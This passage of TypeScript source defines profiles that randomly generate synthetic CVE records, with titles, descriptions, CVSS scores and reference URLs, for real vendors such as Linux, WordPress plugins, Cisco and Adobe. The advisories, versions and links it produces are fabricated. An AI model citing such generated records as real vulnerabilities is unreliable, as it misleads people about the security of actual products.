  ['fix double free in', 'CWE-415'],
];
const KERNEL_FN = ['_init', '_rx_handler', '_release', '_get_next', '_parse_attr', '_dequeue', '_free_ctx', '_xmit', '_probe', '_remove', '_ioctl', '_complete', '_reset', '_setup'];
const linux: Profile = {
  cna: 'Linux',
  total: 1_120,
  batches: [['2026-10-03', 88, 15], ['2026-10-09', 121, 14], ['2026-10-18', 435, 15], ['2026-10-23', 217, 14]],
  tz: 'eu',
  ssvc: 0.55,
  exploitWeight: 0.15,
  artifactWeight: 0.2,
  aiWeight: 0.8,
  make() {
    const subsys = pick(KERNEL_SUBSYS);
    const [fix, cwe] = pick(KERNEL_FIX);
    const stem = (subsys.split(/[:/ ]+/).filter(Boolean).pop() ?? 'dev').replace(/[^a-z0-9]/gi, '_').toLowerCase();
    const title = `${subsys}: ${fix} ${stem}${pick(KERNEL_FN)}()`;
    const adp = chance(0.42) ? makeCvss(chance(0.8) ? { ...KINDS.dos, local: true } : KINDS.eop, '3.1', 'cisa-adp') : null;
    return {
      vendor: 'Linux',
      product: 'Linux',
      purl: null,
      title,
      description: `In the Linux kernel, the following vulnerability has been resolved:\n\n${title}\n\nThe error path did not account for a concurrent ${pick(['close', 'reset', 'unbind', 'reconfiguration'])}, which could leave a stale pointer behind.`,
      cwe: [cwe],
      cvss: adp,
      cnaVector: false,
      references: Array.from({ length: int(2, 4) }, () => `https://git.kernel.org/stable/c/${hex(40)}`),
      prior: V(12),
      noise: 'kernel',
      tags: [],
    };
  },
};

// ── WordPress CNAs ──
const WP_PLUGINS: readonly (readonly [vendor: string, plugin: string])[] = [
  ['wpdevteam', 'Essential Addons for Elementor'], ['Themeisle', 'Otter Blocks'], ['WPMU DEV', 'Forminator Forms'], ['Elementor', 'Elementor Website Builder'],
  ['Awesome Motive', 'WPForms Lite'], ['codeastrology', 'Product Table for WooCommerce'], ['bplugins', 'HTML5 Video Player'], ['smackcoders', 'WP Ultimate CSV Importer'],
  ['Crocoblock', 'JetEngine'], ['Royal Elementor Addons', 'Royal Elementor Addons and Templates'], ['Popup Builder', 'Popup Builder'], ['Kadence WP', 'Kadence Blocks'],
  ['Rank Math', 'Rank Math SEO'], ['GiveWP', 'GiveWP – Donation Plugin'], ['Saturday Drive', 'Ninja Forms'], ['Wpmet', 'MetForm'], ['VeronaLabs', 'WP Statistics'],
  ['W3 Eden', 'Download Manager'], ['Ultimate Member', 'Ultimate Member'], ['WPEverest', 'User Registration'], ['Post SMTP', 'Post SMTP'], ['ThimPress', 'LearnPress'],
  ['Themeum', 'Tutor LMS'], ['WP Chill', 'Gallery PhotoBlocks'], ['VillaTheme', 'Photo Reviews for WooCommerce'], ['kodezen', 'aBlocks'], ['codexonics', 'Prime Mover'],
  ['cozmoslabs', 'Profile Builder'], ['Brainstorm Force', 'Spectra'], ['StellarWP', 'The Events Calendar'], ['WebToffee', 'Import Export WordPress Users'],
  ['Booking Calendar', 'WP Booking Calendar'], ['FunnelKit', 'FunnelKit Funnel Builder'], ['Starter Templates', 'Starter Templates'], ['wpWax', 'Directorist'],
  ['Tickera', 'Tickera'], ['Fluent Forms', 'Fluent Forms'], ['WC Lovers', 'WCFM Marketplace'], ['Liquid Web', 'Restrict Content'], ['bdthemes', 'Element Pack'],
];
const WP_KINDS: readonly (readonly [KindKey, number, string])[] = [
  ['xss', 45, 'Stored Cross-Site Scripting via Shortcode'],
  ['csrf', 9, 'Cross-Site Request Forgery to Settings Update'],
  ['authz', 16, 'Missing Authorization to Sensitive Information Exposure'],
  ['sqli', 8, 'SQL Injection via the orderby Parameter'],
  ['upload', 4, 'Arbitrary File Upload'],
  ['path', 4, 'Local File Inclusion'],
  ['eop', 4, 'Privilege Escalation via Account Takeover'],
  ['deser', 4, 'PHP Object Injection'],
  ['info', 6, 'Sensitive Information Exposure via Log File'],
];
const WP_ACCESS = ['Unauthenticated', 'Authenticated (Subscriber+)', 'Authenticated (Contributor+)', 'Authenticated (Administrator+)'];
function wordpress(cna: 'Wordfence' | 'Patchstack' | 'WPScan', total: number, batches: Profile['batches']): Profile {
  return {
    cna,
    total,
    batches,
    tz: cna === 'Patchstack' ? 'eu' : 'us',
    ssvc: 0.8,
    exploitWeight: 0.05,
    artifactWeight: 0.35,
    aiWeight: 0.3,
    make() {
      const [vendor, plugin] = pick(WP_PLUGINS);
      const [k, , issue] = weighted(WP_KINDS.map((x) => [x, x[1]] as const));
      const kind = KINDS[k];
      const ver = `${int(1, 6)}.${int(0, 19)}.${int(0, 9)}`;
      const access = k === 'csrf' ? 'Unauthenticated' : pick(WP_ACCESS);
      const cvss = makeCvss({ ...kind, local: false }, '3.1', 'cna');
      const slug = slugify(plugin);
      const title =
        cna === 'Patchstack'
          ? `WordPress ${plugin} plugin <= ${ver} - ${kind.label} vulnerability`
          : cna === 'WPScan'
            ? `${plugin} < ${ver} - ${access === 'Unauthenticated' ? 'Unauthenticated' : 'Admin+'} ${issue}`
            : `${plugin} <= ${ver} - ${access} ${issue}`;
      const refs =
        cna === 'Wordfence'
          ? [`https://www.wordfence.com/threat-intel/vulnerabilities/id/${uuid()}?source=cve`, `https://plugins.trac.wordpress.org/changeset/${int(3_100_000, 3_400_000)}/${slug}`]
          : cna === 'Patchstack'
            ? [`https://patchstack.com/database/wordpress/plugin/${slug}/vulnerability/wordpress-${slug}-plugin-${ver.replace(/\./g, '-')}-${slugify(kind.label)}-vulnerability`]
            : [`https://wpscan.com/vulnerability/${uuid()}/`];
      return {
        vendor: cna === 'WPScan' ? 'Unknown' : vendor,
        product: plugin,
        purl: null,
        title,
        description: `The ${plugin} plugin for WordPress is vulnerable to ${issue.replace(/ via .*/, '')} in all versions up to, and including, ${ver}. This makes it possible for ${access.toLowerCase().replace(/[()]/g, '')} attackers to ${kind.effect}.`,
        cwe: [kind.cwe],
        cvss,
        cnaVector: true,
        references: refs,
        prior: NONE,
        noise: 'wordpress',
        tags: [],
      };
    },
  };
}

// ── VulnCheck ──
const VULNCHECK: readonly ProductDef[] = [
  prod('ananthakumaran', 'paisa'), prod('Blazity', 'next-saas-stripe-starter'), prod('cheaper-inference', 'OmniRoute'), prod('Syncplify, Inc.', 'Syncplify Server!'),
  prod('FlowiseAI', 'Flowise', P(1)), prod('langflow-ai', 'Langflow', P(2)), prod('open-webui', 'Open WebUI'), prod('n8n-io', 'n8n'), prod('langgenius', 'Dify'),
  prod('comfyanonymous', 'ComfyUI'), prod('GongRzhe', 'Office-PowerPoint-MCP-Server', NONE, 'pkg:pypi/office-powerpoint-mcp-server'), prod('TP-Link Systems Inc.', 'Archer C7', P(5)),
  prod('D-Link', 'DIR-825', V(31)), prod('Zyxel', 'NAS326', P(3)), prod('NETGEAR', 'R7000', V(9)), prod('Tenda', 'AC10', V(2)), prod('Hikvision', 'DS-2CD2xx2F', V(3)),
  prod('GeoVision', 'GV-ASManager', V(5)), prod('Ruckus Networks', 'Unleashed', V(1)), prod('LibreNMS', 'LibreNMS'), prod('Zabbix', 'Zabbix', P(1)), prod('Grafana Labs', 'Grafana', P(1)),
  prod('Gitblit', 'Gitblit'), prod('Pydio', 'Cells'), prod('Kanboard', 'Kanboard'), prod('Ollama', 'Ollama'), prod('Sunbird', 'DCIM'), prod('Planet Technology', 'WGS-804HPT'),
  prod('Edimax', 'IC-7100', P(1)), prod('Akuvox', 'E11'), prod('XWiki', 'XWiki Platform', P(1)), prod('SuiteCRM', 'SuiteCRM'), prod('BentoML', 'BentoML'), prod('NetAlertX', 'NetAlertX'),
  prod('Tautulli', 'Tautulli'), prod('Commvault', 'Command Center', P(2)), prod('Craft CMS', 'Craft CMS', P(2)), prod('Erlang', 'Erlang/OTP', P(1)),
];
const VC_LOCATIONS = ['/api/sync/tokens', 'the Editor and Sheet API', 'the backup restore endpoint', 'the plugin installer', 'the webhook handler', 'crafted ZIP archives', 'the diagnostics page', 'the MCP tool handler', 'the login form', 'the firmware upload page'];
const vulncheck: Profile = {
  cna: 'VulnCheck',
  total: 2_262,
  batches: [['2026-10-12', 311, 23], ['2026-10-14', 156, 22]],
  tz: 'us',
  ssvc: 0.85,
  exploitWeight: 1.0,
  artifactWeight: 1.6,
  aiWeight: 1.2,
  make() {
    const p = pick(VULNCHECK);
    const k = pick<KindKey>(['path', 'auth', 'cmdi', 'ssrf', 'sqli', 'xss', 'authz', 'deser', 'creds', 'upload', 'info']);
    const kind = KINDS[k];
    const fixed = `${int(0, 9)}.${int(0, 30)}.${int(1, 60)}`;
    const ver = chance(0.5) ? `before ${fixed}` : `< ${fixed}`;
    const where = pick(VC_LOCATIONS);
    const eol = chance(0.04);
    const band = weighted<Band>([['crit', 0.14], ['high', 0.4], ['med', 0.41], ['low', 0.05]]);
    const cvss = makeCvss({ ...kind, local: false }, chance(0.8) ? '4.0' : '3.1', 'cna', '', band);
    const label = k === 'auth' ? 'Missing Authentication' : kind.label;
    return {
      vendor: p.vendor,
      product: p.product,
      purl: p.purl ?? null,
      title: `${p.product} ${ver} ${label} via ${where.replace(/^the /, '')}`,
      description: `${p.product} ${ver} contains a ${label.toLowerCase()} vulnerability in ${where} that allows ${cvss.vector.includes('PR:N') ? 'unauthenticated remote' : 'authenticated'} attackers to ${kind.effect}.${eol ? ' This product is no longer supported by the maintainer.' : ''}`,
      cwe: [kind.cwe],
      cvss,
      cnaVector: true,
      references: [`https://www.vulncheck.com/advisories/${slugify(`${p.product} ${label}`)}`, `https://github.com/${slugify(p.vendor)}/${slugify(p.product)}/security/advisories/${ghsa()}`],
      prior: p.prior,
      noise: null,
      tags: eol ? ['unsupported-when-assigned'] : [],
    };
  },
};

// ── GitHub advisories ──
const GITHUB: readonly ProductDef[] = [
  prod('vercel', 'next.js', NONE, 'pkg:npm/next'), prod('vitejs', 'vite', NONE, 'pkg:npm/vite'), prod('danielgatis', 'rembg', NONE, 'pkg:pypi/rembg'),
  prod('backstage', 'backstage', NONE, 'pkg:npm/@backstage/plugin-catalog-backend'), prod('asterisk', 'asterisk'), prod('langchain-ai', 'langchain', NONE, 'pkg:pypi/langchain-core'),
  prod('gradio-app', 'gradio', NONE, 'pkg:pypi/gradio'), prod('mlflow', 'mlflow', NONE, 'pkg:pypi/mlflow'), prod('directus', 'directus', NONE, 'pkg:npm/directus'),
  prod('strapi', 'strapi', NONE, 'pkg:npm/@strapi/strapi'), prod('parse-community', 'parse-server', NONE, 'pkg:npm/parse-server'), prod('pyload', 'pyload', NONE, 'pkg:pypi/pyload-ng'),
  prod('traefik', 'traefik', NONE, 'pkg:golang/github.com/traefik/traefik/v3'), prod('argoproj', 'argo-cd', NONE, 'pkg:golang/github.com/argoproj/argo-cd/v3'),
  prod('goauthentik', 'authentik'), prod('zitadel', 'zitadel'), prod('mastodon', 'mastodon'), prod('discourse', 'discourse'), prod('openemr', 'openemr'),
  prod('pimcore', 'pimcore'), prod('craftcms', 'cms', P(2), 'pkg:composer/craftcms/cms'), prod('umbraco', 'Umbraco-CMS'), prod('filebrowser', 'filebrowser'),
  prod('sveltejs', 'kit', NONE, 'pkg:npm/@sveltejs/kit'), prod('nuxt', 'nuxt', NONE, 'pkg:npm/nuxt'), prod('remix-run', 'react-router', NONE, 'pkg:npm/react-router'),
  prod('axios', 'axios', NONE, 'pkg:npm/axios'), prod('frappe', 'frappe'), prod('WeblateOrg', 'weblate'), prod('getgrav', 'grav'), prod('FreshRSS', 'FreshRSS'),
  prod('huggingface', 'transformers', NONE, 'pkg:pypi/transformers'), prod('vllm-project', 'vllm', NONE, 'pkg:pypi/vllm'), prod('BerriAI', 'litellm', NONE, 'pkg:pypi/litellm'),
  prod('PrefectHQ', 'prefect', NONE, 'pkg:pypi/prefect'), prod('nextcloud', 'server', V(1)), prod('grafana', 'grafana', P(1)),
];
const GH_ISSUES: readonly (readonly [KindKey, string])[] = [
  ['ssrf', 'SSRF in the image proxy allows access to cloud metadata'], ['path', 'path traversal in static file serving'], ['xss', 'stored XSS in markdown preview'],
  ['authz', 'missing authorization on the admin API'], ['auth', 'authentication bypass via crafted JWT'], ['deser', 'unsafe deserialization of cached objects'],
  ['dos', 'regular expression denial of service in header parsing'], ['info', 'session tokens written to debug logs'], ['redirect', 'open redirect after login'],
  ['cmdi', 'command injection through the git integration'], ['sfb', 'CSRF protection can be bypassed with a crafted Origin header'], ['race', 'race condition allows double redemption of invites'],
];
const titleCase = (s: string) => s.charAt(0).toUpperCase() + s.slice(1);
const github: Profile = {
  cna: 'GitHub_M',
  total: 1_287,
  tz: 'us',
  ssvc: 0.8,
  exploitWeight: 0.25,
  artifactWeight: 1.1,
  aiWeight: 2.6,
  make() {
    const p = pick(GITHUB);
    const [k, issue] = pick(GH_ISSUES);
    const kind = KINDS[k];
    const name = titleCase(p.product);
    const cvss = makeCvss({ ...kind, local: false }, chance(0.6) ? '3.1' : '4.0', 'cna');
    const title = pick([`${name}: ${titleCase(issue)}`, `${name} has ${issue}`, `${name} is vulnerable to ${issue}`]);
    return {
      vendor: p.vendor,
      product: p.product,
      purl: p.purl ?? null,
      title,
      description: `${name} is affected by ${issue}. Versions prior to ${int(1, 15)}.${int(0, 20)}.${int(0, 12)} are affected; the issue is fixed in that release.`,
      cwe: [kind.cwe],
      cvss,
      cnaVector: true,
      references: [`https://github.com/${p.vendor}/${p.product}/security/advisories/${ghsa()}`, `https://github.com/${p.vendor}/${p.product}/commit/${hex(40)}`],
      prior: p.prior,
      noise: null,
      tags: [],
    };
  },
};

// ── VulDB ──
const VULDB_HOBBY: readonly ProductDef[] = [
  prod('SourceCodester', 'Best Salon Management System'), prod('SourceCodester', 'Online Exam System'), prod('code-projects', 'Online Shopping System'),
  prod('code-projects', 'Hostel Management System'), prod('itsourcecode', 'Online Hotel Reservation System'), prod('PHPGurukul', 'Hospital Management System'),
  prod('PHPGurukul', 'Vehicle Parking Management System'), prod('campcodes', 'Online Recruitment Management System'), prod('kashipara', 'Food Management System'),
  prod('projectworlds', 'Online Examination System'), prod('SourceCodester', 'Pet Grooming Management Software'), prod('code-projects', 'Library Management System'),
];
const VULDB_IOT: readonly ProductDef[] = [
  prod('Tenda', 'AC18', V(2)), prod('TOTOLINK', 'A3300R', V(1)), prod('D-Link', 'DIR-645', V(31)), prod('UTT', 'HiPER 840G'), prod('Wavlink', 'WL-WN579X3'),
  prod('Linksys', 'RE6500', V(2)), prod('H3C', 'Magic B1STV'), prod('Ruijie', 'RG-EW1200G'), prod('Four-Faith', 'F3x24', P(1)), prod('Oray', 'Pugongying X5 Pro'),
];
const VULDB_MISC: readonly ProductDef[] = [
  prod('jeecgboot', 'JeecgBoot'), prod('YunaiV', 'ruoyi-vue-pro'), prod('Yonyou', 'U8 Cloud'), prod('Jinher', 'OA'), prod('a2aproject', 'a2a-dotnet'),
  prod('Kingdee', 'EAS'), prod('ShopXO', 'ShopXO'), prod('dromara', 'Sa-Token'), prod('macrozheng', 'mall'), prod('ChestnutCMS', 'ChestnutCMS'),
];
const VULDB_KINDS: readonly (readonly [KindKey, string])[] = [
  ['sqli', 'sql injection'], ['xss', 'cross site scripting'], ['overflow', 'stack-based overflow'], ['cmdi', 'os command injection'], ['upload', 'unrestricted upload'],
  ['path', 'path traversal'], ['authz', 'improper authorization'], ['info', 'information disclosure'], ['csrf', 'cross-site request forgery'], ['deser', 'deserialization'],
  ['ssrf', 'server-side request forgery'], ['creds', 'hard-coded credentials'],
];
const vuldb: Profile = {
  cna: 'VulDB',
  total: 875,
  tz: 'asia',
  ssvc: 0.78,
  exploitWeight: 0.05,
  artifactWeight: 0.5,
  aiWeight: 0.4,
  make() {
    const family = weighted<'hobby' | 'iot' | 'misc'>([['hobby', 0.58], ['iot', 0.26], ['misc', 0.16]]);
    const p = pick(family === 'hobby' ? VULDB_HOBBY : family === 'iot' ? VULDB_IOT : VULDB_MISC);
    const [k, phrase] = pick(family === 'iot' ? VULDB_KINDS.filter(([key]) => key === 'overflow' || key === 'cmdi' || key === 'info') : VULDB_KINDS);
    const kind = KINDS[k];
    const ver = family === 'hobby' ? '1.0' : family === 'iot' ? `${int(1, 16)}.${int(0, 9)}.${int(0, 99)}.${int(1, 30)}` : `up to ${int(1, 9)}.${int(0, 12)}.${int(0, 9)}`;
    const file = family === 'iot' ? `/goform/${pick(['SetIpMacBind', 'setWizardCfg', 'formSetFirewall', 'WifiExtraSet', 'setSchedWifi'])}` : `/${pick(['admin/', ''])}${pick(['edit', 'add-services', 'login', 'view', 'search', 'profile', 'manage-users', 'delete'])}.php`;
    const arg = pick(['id', 'username', 'search', 'page', 'cmd', 'ip', 'file', 'deviceName']);
    const title = `${p.vendor} ${p.product} ${ver} ${file} ${phrase}`;
    const cvss = makeCvss({ ...kind, local: false }, '4.0', 'cna', '/E:P', weighted<Band>([['crit', 0.08], ['high', 0.22], ['med', 0.68], ['low', 0.02]]));
    return {
      vendor: p.vendor,
      product: p.product,
      purl: null,
      title,
      description:
        `A vulnerability was ${pick(['found', 'identified', 'detected'])} in ${p.vendor} ${p.product} ${ver}. ` +
        `This affects an unknown part of the file ${file}. The manipulation of the argument ${arg} leads to ${phrase}. ` +
        'The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.',
      cwe: [kind.cwe],
      cvss,
      cnaVector: false,
      references: [`https://vuldb.com/?id.${int(320_000, 340_000)}`, `https://vuldb.com/?ctiid.${int(320_000, 340_000)}`],
      prior: p.prior,
      noise: family === 'hobby' ? 'hobby' : null,
      tags: [],
    };
  },
};

// ── Long tail: generic CNAs ──
type TitleStyle = 'vuln' | 'colon' | 'pipe' | 'none' | 'drupal';
interface TailSpec {
  cna: string;
  total: number;
  products: readonly ProductDef[];
  kinds: readonly KindKey[];
  style: TitleStyle;
  version?: '3.1' | '4.0';
  /** P(CNA CVSS); otherwise CISA-ADP may score it. */
  cvssRate?: number;
  batches?: Profile['batches'];
  tz?: Profile['tz'];
  ssvc?: number;
  exploitWeight?: number;
  artifactWeight?: number;
  aiWeight?: number;
  domain?: string;
}
const DRUPAL_RISK = ['Moderately critical', 'Less critical', 'Critical'];
function tail(s: TailSpec): Profile {
  return {
    cna: s.cna,
    total: s.total,
    batches: s.batches,
    tz: s.tz ?? 'us',
    ssvc: s.ssvc ?? 0.75,
    exploitWeight: s.exploitWeight ?? 0.5,
    artifactWeight: s.artifactWeight ?? 0.6,
    aiWeight: s.aiWeight ?? 0.3,
    make(id) {
      const p = pick(s.products);
      const kind = KINDS[pick(s.kinds)];
      const hasCna = chance(s.cvssRate ?? 1);
      const cvss = hasCna ? makeCvss(kind, s.version ?? '3.1', 'cna') : chance(0.55) ? makeCvss(kind, '3.1', 'cisa-adp') : null;
      const ver = `${int(1, 25)}.${int(0, 9)}${chance(0.5) ? `.${int(0, 20)}` : ''}`;
      const actor = cvss?.vector.includes('PR:N') ? 'an unauthenticated, remote attacker' : cvss?.vector.includes('AV:L') ? 'a local attacker' : 'an authenticated attacker';
      const product = p.product;
      const title =
        s.style === 'vuln'
          ? `${product} ${kind.label} Vulnerability`
          : s.style === 'colon'
            ? `${product}: ${kind.label} in ${pick(['the web management interface', 'the REST API', 'the CLI', 'packet processing', 'the file parser', 'session handling'])}`
            : s.style === 'pipe'
              ? `${product} | ${kind.label} (${kind.cwe})`
              : s.style === 'drupal'
                ? `${product} - ${pick(DRUPAL_RISK)} - ${kind.label} - SA-CONTRIB-2026-${int(80, 140)}`
                : null;
      const vendorText = p.vendor ? `${p.vendor} ` : '';
      return {
        vendor: p.vendor,
        product,
        purl: p.purl ?? null,
        title,
        description: `${titleCase(kind.label.toLowerCase())} in ${vendorText}${product || 'the product'} ${ver} and earlier allows ${actor} to ${kind.effect}${pick([' via a crafted request.', ' via specially crafted input.', '.', ' under certain configurations.'])}`,
        cwe: [kind.cwe],
        cvss,
        cnaVector: hasCna,
        references: [`https://${s.domain ?? `${slugify(p.vendor || s.cna)}.com`}/security/advisories/${id.toLowerCase()}`],
        prior: p.prior,
        noise: null,
        tags: s.cna === 'mitre' && chance(0.02) ? ['disputed'] : [],
      };
    },
  };
}

const TAILS: readonly TailSpec[] = [
  { cna: 'apache', total: 384, style: 'colon', batches: [['2026-10-19', 62, 9], ['2026-10-21', 69, 10]], tz: 'eu', domain: 'lists.apache.org', aiWeight: 1.2,
    products: [prod('Apache Software Foundation', 'Apache Tomcat', P(6)), prod('Apache Software Foundation', 'Apache Airflow'), prod('Apache Software Foundation', 'Apache Kafka'), prod('Apache Software Foundation', 'Apache HTTP Server', P(5)), prod('Apache Software Foundation', 'Apache Superset'), prod('Apache Software Foundation', 'Apache ActiveMQ', P(3)), prod('Apache Software Foundation', 'Apache OFBiz', P(2)), prod('Apache Software Foundation', 'Apache Struts', P(4)), prod('Apache Software Foundation', 'Apache Solr', P(2)), prod('Apache Software Foundation', 'Apache Camel', V(38)), prod('Apache Software Foundation', 'Apache NiFi', V(38)), prod('Apache Software Foundation', 'Apache Doris', V(38)), prod('Apache Software Foundation', 'Apache Answer', V(38)), prod('Apache Software Foundation', 'Apache Traffic Server', V(38))],
    kinds: ['deser', 'path', 'ssrf', 'auth', 'xss', 'info', 'dos', 'xxe', 'authz'] },
  { cna: 'mitre', total: 373, style: 'none', cvssRate: 0, ssvc: 0.6, aiWeight: 1.6, domain: 'github.com',
    products: [prod('', ''), prod('', ''), prod('', ''), prod('osmocom', 'libosmocore'), prod('NexoPOS', 'NexoPOS'), prod('Wazuh', 'Wazuh', NONE)],
    kinds: ['overflow', 'sqli', 'xss', 'cmdi', 'path', 'dos', 'info', 'auth'] },
  { cna: 'ibm', total: 259, style: 'vuln', domain: 'www.ibm.com',
    products: [prod('IBM', 'QRadar SIEM', V(22)), prod('IBM', 'WebSphere Application Server', P(3)), prod('IBM', 'Db2', V(22)), prod('IBM', 'Sterling B2B Integrator', V(22)), prod('IBM', 'Cognos Analytics', V(22)), prod('IBM', 'MQ', V(22)), prod('IBM', 'Guardium Data Protection', V(22)), prod('IBM', 'Security Verify Access', V(22)), prod('IBM', 'Maximo Application Suite', V(22)), prod('IBM', 'Aspera Faspex', P(1)), prod('IBM', 'Planning Analytics', V(22))],
    kinds: ['xss', 'info', 'dos', 'sqli', 'auth', 'xxe', 'csrf', 'eop'] },
  { cna: 'redhat', total: 232, style: 'colon', domain: 'access.redhat.com', ssvc: 0.9,
    products: [prod('Red Hat', 'Red Hat Enterprise Linux 10', V(9)), prod('Red Hat', 'Red Hat OpenShift Container Platform 4', V(9)), prod('Red Hat', 'Red Hat Ansible Automation Platform 2', V(9)), prod('Red Hat', 'Keycloak', V(9)), prod('Red Hat', 'libxml2', V(9)), prod('Red Hat', 'glib', V(9)), prod('Red Hat', 'podman', V(9)), prod('Red Hat', 'libsoup', V(9))],
    kinds: ['dos', 'overflow', 'info', 'auth', 'path', 'race', 'eop'] },
  { cna: 'adobe', total: 179, style: 'pipe', batches: [['2026-10-13', 177, 17]], domain: 'helpx.adobe.com', ssvc: 0.9,
    products: [prod('Adobe', 'Adobe Experience Manager', V(26)), prod('Adobe', 'Acrobat Reader', P(9)), prod('Adobe', 'Illustrator', V(26)), prod('Adobe', 'Photoshop', V(26)), prod('Adobe', 'InDesign', V(26)), prod('Adobe', 'Substance 3D Stager', V(26)), prod('Adobe', 'Adobe Commerce', P(3)), prod('Adobe', 'ColdFusion', P(6)), prod('Adobe', 'Animate', V(26))],
    kinds: ['xss', 'xss', 'xss', 'oob', 'uaf', 'overflow', 'info', 'path'] },
  { cna: 'hpe', total: 177, style: 'vuln', batches: [['2026-10-22', 71, 16]],
    products: [prod('Hewlett Packard Enterprise (HPE)', 'HPE Aruba Networking ClearPass Policy Manager', V(4)), prod('Hewlett Packard Enterprise (HPE)', 'HPE Aruba Networking AOS-CX', V(4)), prod('Hewlett Packard Enterprise (HPE)', 'HPE OneView', P(1)), prod('Hewlett Packard Enterprise (HPE)', 'HPE Integrated Lights-Out 6 (iLO 6)', V(4)), prod('Hewlett Packard Enterprise (HPE)', 'HPE StoreOnce', V(4))],
    kinds: ['cmdi', 'auth', 'xss', 'info', 'eop', 'dos'] },
  { cna: 'mozilla', total: 172, style: 'none', batches: [['2026-10-13', 83, 13]], cvssRate: 0, ssvc: 0.92, domain: 'www.mozilla.org', aiWeight: 2.4,
    products: [prod('Mozilla', 'Firefox', P(11)), prod('Mozilla', 'Firefox ESR', P(11)), prod('Mozilla', 'Thunderbird', V(14)), prod('Mozilla', 'Firefox for iOS', V(14))],
    kinds: ['uaf', 'overflow', 'spoof', 'sfb', 'oob', 'race'] },
  { cna: 'juniper', total: 153, style: 'colon', batches: [['2026-10-14', 153, 16]], version: '4.0', domain: 'supportportal.juniper.net',
    products: [prod('Juniper Networks', 'Junos OS', P(8)), prod('Juniper Networks', 'Junos OS Evolved', P(8)), prod('Juniper Networks', 'Juniper Secure Analytics', V(10)), prod('Juniper Networks', 'Session Smart Router', V(10))],
    kinds: ['dos', 'dos', 'auth', 'cmdi', 'info', 'eop'] },
  { cna: 'nvidia', total: 136, style: 'vuln', domain: 'nvidia.custhelp.com', aiWeight: 0.6,
    products: [prod('NVIDIA', 'CUDA Toolkit'), prod('NVIDIA', 'GPU Display Driver'), prod('NVIDIA', 'NeMo Framework'), prod('NVIDIA', 'Triton Inference Server'), prod('NVIDIA', 'Megatron-LM'), prod('NVIDIA', 'Container Toolkit'), prod('NVIDIA', 'TensorRT-LLM')],
    kinds: ['deser', 'overflow', 'eop', 'info', 'cmdi', 'path'] },
  { cna: 'cisco', total: 125, style: 'vuln', batches: [['2026-10-21', 65, 16]], domain: 'sec.cloudapps.cisco.com', exploitWeight: 2.2, artifactWeight: 1.2,
    products: [prod('Cisco', 'Cisco IOS XE Software', P(14)), prod('Cisco', 'Cisco Adaptive Security Appliance (ASA) Software', P(12)), prod('Cisco', 'Cisco Firepower Threat Defense Software', P(5)), prod('Cisco', 'Cisco Identity Services Engine Software', P(4)), prod('Cisco', 'Cisco Unified Communications Manager', V(80)), prod('Splunk', 'Splunk SOAR', V(1)), prod('Splunk', 'Splunk Enterprise', V(1))],
    kinds: ['cmdi', 'auth', 'dos', 'xss', 'info', 'eop', 'rce'] },
  { cna: 'GitLab', total: 118, style: 'none', domain: 'gitlab.com', aiWeight: 0.8,
    products: [prod('GitLab', 'GitLab', P(2))], kinds: ['xss', 'authz', 'dos', 'info', 'ssrf', 'auth'] },
  { cna: 'eclipse', total: 107, style: 'colon', domain: 'gitlab.eclipse.org',
    products: [prod('Eclipse Foundation', 'Eclipse Jetty'), prod('Eclipse Foundation', 'Eclipse GlassFish'), prod('Eclipse Foundation', 'Eclipse Theia'), prod('Eclipse Foundation', 'Eclipse Vert.x')],
    kinds: ['dos', 'xss', 'path', 'info', 'redirect'] },
  { cna: 'icscert', total: 89, style: 'vuln', domain: 'www.cisa.gov', ssvc: 0.95,
    products: [prod('Delta Electronics', 'DIAEnergie', P(1)), prod('Mitsubishi Electric', 'MELSEC iQ-R Series', V(1)), prod('Rockwell Automation', 'FactoryTalk Optix', V(4)), prod('Schneider Electric', 'EcoStruxure Power Monitoring Expert', V(3)), prod('Hitachi Energy', 'MicroSCADA X SYS600'), prod('Dingtian', 'DT-R0 Series')],
    kinds: ['auth', 'overflow', 'path', 'creds', 'cmdi', 'dos'] },
  { cna: 'cisa-cg', total: 79, style: 'vuln', ssvc: 0.95,
    products: [prod('Optigo Networks', 'ONS NC600'), prod('Radiflow', 'iSAP Smart Collector'), prod('Instantel', 'Micromate'), prod('Gardyn', 'Home Kit')], kinds: ['creds', 'auth', 'cmdi', 'info'] },
  { cna: 'Gitea', total: 78, style: 'colon', domain: 'blog.gitea.com',
    products: [prod('Gitea', 'Gitea')], kinds: ['xss', 'authz', 'path', 'info'] },
  { cna: 'ProgressSoftware', total: 73, style: 'vuln', domain: 'community.progress.com', exploitWeight: 1.8, artifactWeight: 1.4,
    products: [prod('Progress Software Corporation', 'MOVEit Transfer', P(2)), prod('Progress Software Corporation', 'Telerik UI for ASP.NET AJAX', P(3)), prod('Progress Software Corporation', 'WhatsUp Gold', P(2)), prod('Progress Software Corporation', 'OpenEdge', V(9)), prod('Progress Software Corporation', 'Sitefinity', V(9)), prod('Progress Software Corporation', 'LoadMaster', V(9))],
    kinds: ['sqli', 'deser', 'auth', 'path', 'xss', 'cmdi'] },
  { cna: 'drupal', total: 72, style: 'drupal', batches: [['2026-10-22', 72, 18]], cvssRate: 0.1, domain: 'www.drupal.org',
    products: [prod('Drupal', 'Webform', V(4)), prod('Drupal', 'Paragraphs', V(4)), prod('Drupal', 'Simple OAuth', V(4)), prod('Drupal', 'AI (Artificial Intelligence)', V(4)), prod('Drupal', 'Layout Paragraphs', V(4)), prod('Drupal', 'Advanced Search', V(4))],
    kinds: ['xss', 'authz', 'csrf', 'info', 'sfb'] },
  { cna: 'dell', total: 68, style: 'vuln', domain: 'www.dell.com',
    products: [prod('Dell', 'PowerScale OneFS', V(3)), prod('Dell', 'iDRAC9', V(3)), prod('Dell', 'PowerProtect Data Domain', V(3)), prod('Dell', 'Client Platform BIOS', V(3)), prod('Dell', 'Wyse Management Suite', V(3))],
    kinds: ['eop', 'info', 'cmdi', 'auth', 'path'] },
  { cna: 'zephyr', total: 63, style: 'colon', domain: 'github.com',
    products: [prod('zephyrproject-rtos', 'Zephyr')], kinds: ['overflow', 'oob', 'dos', 'race'] },
  { cna: 'brocade', total: 61, style: 'vuln', batches: [['2026-10-15', 52, 18]], domain: 'support.broadcom.com',
    products: [prod('Brocade', 'Fabric OS', P(1)), prod('Brocade', 'SANnav', V(1))], kinds: ['cmdi', 'eop', 'info', 'creds'] },
  { cna: 'fortinet', total: 46, style: 'none', domain: 'fortiguard.fortinet.com', exploitWeight: 9, artifactWeight: 3,
